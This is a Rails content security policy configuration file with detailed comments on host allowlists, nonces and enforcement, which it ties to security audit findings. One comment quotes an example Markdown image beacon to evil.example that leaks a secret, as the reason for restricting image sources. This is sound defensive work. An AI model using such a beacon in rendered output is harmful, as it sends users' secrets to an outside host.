# Be sure to restart your server when you modify this file.

# Define an application-wide content security policy.
# See the Securing Rails Applications Guide for more information:
# https://guides.rubyonrails.org/security.html#content-security-policy-header

Rails.application.configure do
  config.content_security_policy do |policy|
    policy.default_src :self, :https
    policy.font_src    :self, :https, :data
    # Concrete hosts only (S1 / audit 06-H1): a bare :https wildcard lets any
    # https image load, including exfil beacons like
    # ![](https://evil.example/?d=secret) rendered from chat Markdown.
    # cdn.brandfetch.io serves merchant/security logos, hatscripts.github.io
    # serves the currency flag SVGs (see _combobox_security.turbo_stream.erb).
    policy.img_src     :self, :data, "https://cdn.brandfetch.io", "https://hatscripts.github.io"
    policy.object_src  :none
    # script_src is nonce-only for same-origin/inline scripts, plus the exact
    # external hosts the app actually loads scripts from (no generic :https —
    # that would let ANY https script run, defeating the point of an
    # allowlist): PostHog (posthog.rb host + the array.js it fetches from the
    # sibling -assets host, see _posthog.html.erb) and Plaid Link
    # (plaid_controller.js loads link-initialize.js from cdn.plaid.com).
    policy.script_src  :self, "https://us.i.posthog.com", "https://us-assets.i.posthog.com", "https://cdn.plaid.com"
    # :unsafe_inline is required alongside the nonce: nonces only cover
    # <style> elements, never style="..." attributes or element.style.x = y
    # (the CSP spec has no mechanism for nonce'ing attributes at all, and
    # per-value sha256 hashing isn't viable for values D3 computes at
    # render time from live data). D3 sets chart styling this way for
    # every chart controller (sankey/donut/time_series) via its native
    # .style() API, so this was blocking real chart rendering outright,
    # not a hypothetical gap -- confirmed live via a blank dashboard and a
    # page full of "Applying inline style violates ... style-src" console
    # errors. script-src stays nonce-only; script injection is the far
    # more dangerous vector and isn't affected by this change.
    policy.style_src   :self, :https, :unsafe_inline
    policy.connect_src :self, :https, "https://us.i.posthog.com"

    # Report violations so there's evidence to check before enforcing —
    # without this, report-only mode silently discards every violation and
    # "confirm the reports are clean" has nothing to confirm against.
    policy.report_uri "/csp_reports"
  end

  # Generate session nonces for permitted importmap and inline scripts.
  #
  # style-src deliberately does NOT get a nonce: per the CSP spec, a
  # nonce-source on a directive makes browsers ignore :unsafe_inline on
  # that same directive, which would silently re-block every D3-driven
  # style="..." the charts set (see the style_src line above for why that
  # can't be worked around with nonces at all).
  config.content_security_policy_nonce_generator = ->(request) { SecureRandom.base64(16) }
  config.content_security_policy_nonce_directives = %w[script-src]

  # Enforced by default (S1 / audit 06-H1: was shipped report-only, which
  # silently discards every violation instead of blocking it). Override via
  # CSP_REPORT_ONLY=true to fall back to report-only if enforcement turns up
  # an allowlist gap in production.
  config.content_security_policy_report_only = ENV.fetch("CSP_REPORT_ONLY", "false") == "true"
end
